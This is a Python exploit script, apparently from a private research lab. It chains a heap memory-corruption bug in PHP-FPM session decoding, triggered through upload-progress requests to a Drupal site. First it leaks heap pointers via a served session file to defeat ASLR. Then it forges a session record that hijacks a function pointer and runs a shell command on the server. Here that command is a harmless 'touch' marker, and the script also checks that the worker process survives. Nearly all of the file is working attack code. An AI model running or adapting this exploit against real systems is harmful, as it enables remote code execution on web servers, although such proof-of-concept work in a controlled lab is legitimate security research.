#!/usr/bin/env python3
"""One fresh-master Drupal F14 repeat run.

Stage A (gdb calibration + real leak):
  plant script OOM -> parse P/B0 -> trigger 81920 S|J|K with used=-0x1405
  -> parse X/S_dest/PS_WRITE -> fetch served leak -> K_dest.

Stage B (gdb-free final zif):
  fresh worker -> plant -> trigger.php -> marker -> health/same-worker.

No master restart here; the caller restarts the private FPM master for fresh ASLR.
"""
import hashlib
import json
import os
import re
import signal
import struct
import subprocess
import sys
import time

LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool  # noqa: E402
from tool import field, filepart  # noqa: E402

TOTAL = 81920
USED = -0x1405           # baseline: S_dest = K_dest-0x13fc0, D=K_dest-0x2f80
TARGET = 0x22C54C8
ZIF = 0xA3C074
D_OFF_LEAK = 0x80
D_OFF_FINAL = 0x88
SMALL = b"S" * 32
N_LEAK = 4096
LABEL = sys.argv[1] if len(sys.argv) > 1 else "r0"
MASTER = int(open(LAB + "/run/php-fpm.pid").read().strip())


def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)


def current_worker():
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        try:
            ppid = int(open("/proc/%s/stat" % d).read().split()[3])
            cmd = open("/proc/%s/cmdline" % d, "rb").read().replace(b"\0", b" ").decode("latin1")
        except Exception:
            continue
        if ppid == MASTER and "pool lab" in cmd:
            return int(d)
    return None


def wait_worker(timeout=15.0, different_from=None):
    t0 = time.time()
    while time.time() - t0 < timeout:
        w = current_worker()
        if w and (different_from is None or w != different_from):
            return w
        time.sleep(0.1)
    return None


def parse_reqs(lines):
    out = {}
    for line in lines:
        m = re.match(r"\[[^]]+\] REQ(\d+) ", line)
        if not m:
            continue
        n = int(m.group(1))
        d = out.setdefault(n, {})
        for key, pat in [
            ("heap", r"PHPRQ_START heap=(0x[0-9a-f]+)"),
            ("dec", r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)"),
            ("tmp", r"TMPVAR entry P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+)"),
            ("ret", r"TMPVAR ret slot=(0x[0-9a-f]+) dtor=(0x[0-9a-f]+) off=(-?\d+) used_now=(-?\d+) pre_val=(0x[0-9a-f]+) pre_type=(0x[0-9a-f]+)"),
            ("write", r"PS_WRITE val=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)"),
            ("shutdown", r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) first_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+) level=(\d+)"),
            ("uvarstr", r"UVAR STR ZSTR ptr=(0x[0-9a-f]+) rc=(\d+) ti=(0x[0-9a-f]+) h=(0x[0-9a-f]+) len=(\d+)"),
            ("bail", r"ZEND_BAILOUT bg=(0x[0-9a-f]+)/(\d+)"),
        ]:
            mm = re.search(pat, line)
            if not mm:
                continue
            if key == "heap":
                d["heap"] = int(mm.group(1), 16)
            elif key == "dec":
                d.setdefault("decodes", []).append((int(mm.group(1), 16), int(mm.group(2))))
            elif key == "tmp":
                d.setdefault("tmps", []).append({"P": int(mm.group(1), 16), "last": int(mm.group(2), 16),
                                                  "used": int(mm.group(3)), "next": int(mm.group(4), 16)})
            elif key == "ret":
                d.setdefault("rets", []).append({"slot": int(mm.group(1), 16), "dtor": int(mm.group(2), 16),
                                                  "off": int(mm.group(3)), "used_now": int(mm.group(4))})
            elif key == "write":
                d["write"] = {"val": int(mm.group(1), 16), "len": int(mm.group(2)), "head": mm.group(3)}
            elif key == "shutdown":
                d["shutdown"] = {"P": int(mm.group(1), 16), "last": int(mm.group(2), 16),
                                 "first": int(mm.group(3), 16), "used": int(mm.group(4)),
                                 "next": int(mm.group(5), 16), "level": int(mm.group(6))}
            elif key == "uvarstr":
                d.setdefault("uvarstrs", []).append({"ptr": int(mm.group(1), 16), "rc": int(mm.group(2)),
                                                      "len": int(mm.group(5))})
            elif key == "bail":
                d.setdefault("bails", []).append((int(mm.group(1), 16), int(mm.group(2))))
    return out


def reqs_from_log():
    return parse_reqs(open(tool.GLOG, errors="replace").read().splitlines())


def attach(worker, tag):
    open(tool.GLOG, "w").close()
    gout = open(LAB + "/logs/gdb_repeat_%s.out" % tag, "wb")
    p = subprocess.Popen(["gdb", "-q", "--batch", "-x", LAB + "/gdb/gb_measure.gdb", "-p", str(worker)],
                         stdout=gout, stderr=subprocess.STDOUT, cwd=LAB, start_new_session=True)
    for _ in range(200):
        if os.path.exists(tool.GLOG) and "armed" in open(tool.GLOG, errors="replace").read():
            return p, True
        if p.poll() is not None:
            break
        time.sleep(0.1)
    return p, False


def kill_gdb(p):
    if p is None or p.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    except Exception:
        try:
            p.terminate()
        except Exception:
            pass
    try:
        p.wait(timeout=3)
    except Exception:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except Exception:
            pass


def build_leak(P, X, total=TOTAL, used=USED):
    head = b"S|s:%d:\"" % len(SMALL) + SMALL + b'";'
    head += b"J|i:%d;" % N_LEAK
    L = total - len(head) - len('K|s:"') - 2 - 1
    for _ in range(12):
        hdr = b"K|s:%d:\"" % L
        want = total - len(head) - len(hdr) - 2
        if want == L:
            break
        L = want
    hdr = b"K|s:%d:\"" % L
    assert len(head) + len(hdr) + L + 2 == total, (len(head) + len(hdr) + L + 2, total)
    blob = bytearray(b"A" * L)
    boff = len(head) + len(hdr)
    base = X + 24
    D = P + D_OFF_LEAK

    def put_addr(addr, val):
        i = (addr - base) - boff
        assert 0 <= i and i + 8 <= L, (hex(addr), i, L, hex(base), boff)
        blob[i:i + 8] = struct.pack("<Q", val & 0xffffffffffffffff)

    for off, val in ((0, P + 56), (8, 0), (16, D), (24, 0), (32, 0),
                     (40, 0), (48, 0x7fffffff), (56, 0), (64, 0)):
        put_addr(P + off, val)
    put_addr(D, used & 0xffffffffffffffff)
    put_addr(D + 8, 0)
    rec = head + hdr + bytes(blob) + b'";'
    assert len(rec) == total
    return rec, {"total": total, "L": L, "boff": boff, "base": base, "P": P, "X": X,
                 "D": D, "used": used}


def build_final(P, X, S, marker):
    cmd = b"touch " + marker.encode() + b";"
    D = P + D_OFF_FINAL
    K = (TARGET - (D + 0x10)) // 16
    assert (TARGET - (D + 0x10)) % 16 == 0 and K < 0
    F = S + 0x200
    val = b"i:%d;" % ZIF
    name_len = TOTAL - 1 - len(val)
    name = bytearray(b"A" * name_len)
    name[0:0x300] = b"\x00" * 0x300
    name[0x18:0x20] = struct.pack("<Q", F)
    name[0x2C:0x30] = struct.pack("<I", 1)
    name[0x50:0x58] = struct.pack("<Q", F)
    name[0x58:0x5C] = struct.pack("<I", 6)
    name[0x210:0x218] = struct.pack("<Q", len(cmd))
    name[0x218:0x218 + len(cmd)] = cmd
    p_off = P - (X + 24)
    assert 0 <= p_off and p_off + 0x48 <= name_len, (hex(p_off), name_len)
    name[p_off + 0x00:p_off + 0x08] = struct.pack("<Q", P + 56)
    name[p_off + 0x08:p_off + 0x10] = struct.pack("<Q", D)
    name[p_off + 0x10:p_off + 0x18] = struct.pack("<Q", D)
    name[p_off + 0x18:p_off + 0x20] = struct.pack("<Q", 0)
    name[p_off + 0x20:p_off + 0x28] = struct.pack("<Q", 0)
    name[p_off + 0x28:p_off + 0x30] = struct.pack("<Q", 0)
    name[p_off + 0x30:p_off + 0x38] = struct.pack("<Q", 0x7fffffff)
    name[p_off + 0x38:p_off + 0x40] = struct.pack("<Q", 0)
    name[p_off + 0x40:p_off + 0x48] = struct.pack("<Q", 0)
    d_off = p_off + D_OFF_FINAL
    assert d_off + 0x10 <= name_len
    name[d_off:d_off + 0x08] = struct.pack("<q", K)
    name[d_off + 0x08:d_off + 0x10] = struct.pack("<Q", 0)
    rec = bytes(name) + b"|" + val
    assert len(rec) == TOTAL, (len(rec), TOTAL)
    assert b"|" not in name
    return rec, {"p_off": p_off, "d_off": d_off, "K": K, "F": F, "name_len": name_len,
                 "S": S, "P": P, "X": X, "cmd_len": len(cmd), "D": D}


def parse_leak(raw):
    prefix = b'S|s:4096:"'
    if not raw.startswith(prefix):
        return {"error": "bad prefix", "head": raw[:80].hex()}
    data = raw[len(prefix):]
    if len(data) < 4096:
        return {"error": "short S", "len": len(raw), "head": raw[:80].hex()}
    k = struct.unpack("<Q", data[8:16])[0]
    ptrs = []
    for off in range(0, 4096 - 8, 8):
        v = struct.unpack("<Q", data[off:off + 8])[0]
        if 0x700000000000 <= v <= 0x800000000000:
            ptrs.append((off, v))
    return {"K_dest": k, "S_len_field": 4096, "S_data_len": len(data),
            "S_prefix": prefix.decode(), "ptr_candidates": len(ptrs),
            "first_ptrs": ptrs[:16]}


def main():
    res = {"label": LABEL, "master": MASTER, "started": time.time(),
           "randomize_va_space": open("/proc/sys/kernel/randomize_va_space").read().strip(),
           "total": TOTAL, "used": USED}
    w0 = wait_worker(10)
    res["worker0"] = w0
    if not w0:
        raise SystemExit("no lab worker for master %s" % MASTER)
    log("master=%s worker0=%s" % (MASTER, w0))

    # ---------------- Stage A: plant + gdb + leak ----------------
    tool.seed(os.path.join(tool.SESS, "sess_pl1"), tool.PLANT_REC)
    g, armed = attach(w0, LABEL + "_leak")
    res["gdb_armed"] = armed
    if not armed:
        kill_gdb(g)
        raise SystemExit("gdb did not arm on worker %s" % w0)
    n0 = tool.req_count()
    r = tool.post("/exploit/sess.php", [field("form", b"x")], tag=LABEL + "_plant", timeout=60, cookie="pl1")
    res["plant"] = {"status": r["status"], "head": r["body"][:200].decode("latin1"), "req": n0 + 1}
    time.sleep(0.8)
    w1 = current_worker()
    res["worker_after_plant"] = w1
    reqs = reqs_from_log()
    plant_req = reqs.get(n0 + 1, {})
    res["plant_req"] = plant_req
    P = None
    B0 = None
    heap = plant_req.get("heap")
    if "shutdown" in plant_req:
        P = plant_req["shutdown"]["P"]
        B0 = plant_req["shutdown"]["last"]
    if not P:
        kill_gdb(g)
        raise SystemExit("no plant P/B0: %r" % (plant_req,))
    res["P_plant"] = P
    res["B0_plant"] = B0
    res["heap"] = heap
    log("plant P=%#x B0=%#x heap=%s" % (P, B0, hex(heap) if heap else None))

    X = P - 0x12000
    rec, geo = build_leak(P, X)
    res["leak_geo"] = geo
    res["leak_seed"] = tool.seed(os.path.join(tool.SESS, "sess_tb1"), rec)
    n1 = tool.req_count()
    r = tool.post("/exploit/sess.php", [field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
                  tag=LABEL + "_leak_trigger", timeout=120, cookie="tb1")
    res["leak_trigger"] = {"status": r["status"], "head": r["body"][:300].decode("latin1"), "req": n1 + 1}
    time.sleep(1.0)
    res["worker_after_leak_trigger"] = current_worker()
    kill_gdb(g)
    reqs = reqs_from_log()
    trig_req = reqs.get(n1 + 1, {})
    res["leak_trigger_req"] = trig_req
    decodes = trig_req.get("decodes", [])
    res["X_measured"] = decodes[0][0] if decodes else None
    s_dest = None
    # The first var_tmp_var ret slot is the S zend_string allocation.  It is
    # logged by gb_measure even when the UVAR breakpoints do not resolve.
    rets = trig_req.get("rets", [])
    if rets:
        s_dest = rets[0].get("slot")
    if not s_dest:
        for u in trig_req.get("uvarstrs", []):
            if u.get("len") == 32:
                s_dest = u["ptr"]
                break
    res["S_dest_measured"] = s_dest
    res["PS_WRITE"] = trig_req.get("write")
    res["bails"] = trig_req.get("bails", [])
    # wait for respawn, then fetch the served leak
    w2 = wait_worker(15, different_from=res.get("worker_after_plant"))
    res["worker_after_leak_respawn"] = w2
    raw = b""
    for attempt in range(10):
        rr = tool.get("/sites/default/files/php/sessions/sess_tb1")
        raw = rr["body"]
        res["leak_get"] = {"status": rr["status"], "len": len(raw), "attempt": attempt + 1}
        if rr["status"] == 200 and len(raw) > 4096:
            break
        time.sleep(0.3)
    res["leak_len"] = len(raw)
    res["leak_sha1"] = hashlib.sha1(raw).hexdigest()
    open(LAB + "/arms/repeat_%s.leak.served.bin" % LABEL, "wb").write(raw)
    leak = parse_leak(raw)
    res["leak"] = leak
    K = leak.get("K_dest")
    res["K_dest"] = K
    if not K:
        json.dump(res, open(LAB + "/arms/repeat_%s.json" % LABEL, "w"), indent=1, default=str)
        raise SystemExit("leak failed: %r" % (leak,))
    res["offsets"] = {
        "K-P": K - P, "K-B0": K - B0, "B0-K": B0 - K,
        "K-X": (K - res["X_measured"]) if res["X_measured"] else None,
        "K-S_dest": (K - s_dest) if s_dest else None,
        "P-K": P - K, "X-K": (res["X_measured"] - K) if res["X_measured"] else None,
        "S_dest-K": (s_dest - K) if s_dest else None,
    }
    res["formula_check"] = {
        "P_formula": K - 0x3000, "P_match": (K - 0x3000 == P),
        "X_formula": K - 0x15000, "X_match": (res["X_measured"] == K - 0x15000),
        "S_dest_formula": K - 0x16FC0, "S_dest_match": (s_dest == K - 0x16FC0),
        "B0_formula": K + 0xB000, "B0_match": (B0 == K + 0xB000),
    }
    log("K=%#x offsets=%r formula=%r" % (K, res["offsets"], res["formula_check"]))
    if not all((P == K - 0x3000, res["X_measured"] == K - 0x15000,
                s_dest == K - 0x16FC0, B0 == K + 0xB000)):
        log("WARNING: one or more offsets deviate on this master")

    # ---------------- Stage B: gdb-free final zif ----------------
    # worker_after_leak_trigger is already the fresh respawn (the poisoned
    # leak worker died).  Use it; do not wait for yet another respawn.
    w3 = current_worker()
    if not w3:
        w3 = wait_worker(15)
    res["worker_before_final"] = w3
    if not w3:
        json.dump(res, open(LAB + "/arms/repeat_%s.json" % LABEL, "w"), indent=1, default=str)
        raise SystemExit("no worker for final")
    P2 = K - 0x3000
    X2 = K - 0x15000
    S = K + 0x18
    marker = LAB + "/MARKER_PASSTHRU_" + LABEL
    try:
        os.unlink(marker)
    except FileNotFoundError:
        pass
    rec, geo = build_final(P2, X2, S, marker)
    res["final_geo"] = geo
    res["final_seed"] = tool.seed(os.path.join(tool.SESS, "sess_tb1"), rec)
    res["final_plant_seed"] = tool.seed(os.path.join(tool.SESS, "sess_pl1"), tool.PLANT_REC)
    res["marker_path"] = marker
    res["marker_before"] = os.path.exists(marker)

    r = tool.post("/exploit/sess.php", [field("form", b"x")], tag=LABEL + "_final_plant", timeout=60, cookie="pl1")
    res["final_plant"] = {"status": r["status"], "head": r["body"][:200].decode("latin1")}
    time.sleep(0.7)
    w4 = current_worker()
    res["worker_after_final_plant"] = w4
    r = tool.post("/exploit/trigger.php", [field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
                  tag=LABEL + "_final_trigger", timeout=120, cookie="tb1")
    res["final_trigger"] = {"status": r["status"], "head": r["body"][:300].decode("latin1")}
    time.sleep(0.8)
    res["marker_after"] = os.path.exists(marker)
    if res["marker_after"]:
        st = os.stat(marker)
        res["marker"] = {"size": st.st_size, "mtime_ns": st.st_mtime_ns}
    w5 = current_worker()
    res["worker_after_final_trigger"] = w5
    r = tool.post("/exploit/health.php", [field("form", b"x")], tag=LABEL + "_final_health", timeout=30)
    res["health"] = {"status": r["status"], "head": r["body"][:100].decode("latin1")}
    time.sleep(0.3)
    res["worker_after_health"] = current_worker()
    raw = open(os.path.join(tool.SESS, "sess_tb1"), "rb").read()
    res["final_file"] = {"len": len(raw), "sha1": hashlib.sha1(raw).hexdigest(), "head": raw[:64].hex()}
    res["survived"] = res["worker_after_final_trigger"] == res["worker_after_health"] == w4
    res["success"] = bool(res["marker_after"] and res["survived"] and r["status"] == 200)
    res["finished"] = time.time()
    json.dump(res, open(LAB + "/arms/repeat_%s.json" % LABEL, "w"), indent=1, default=str)
    print(json.dumps({k: res.get(k) for k in (
        "label", "master", "worker0", "P_plant", "B0_plant", "heap", "K_dest", "offsets",
        "formula_check", "leak_get", "leak_len", "leak_sha1", "worker_before_final",
        "final_plant", "final_trigger", "marker_after", "worker_after_final_trigger",
        "worker_after_health", "health", "survived", "success")}, indent=1, default=str))


if __name__ == "__main__":
    main()
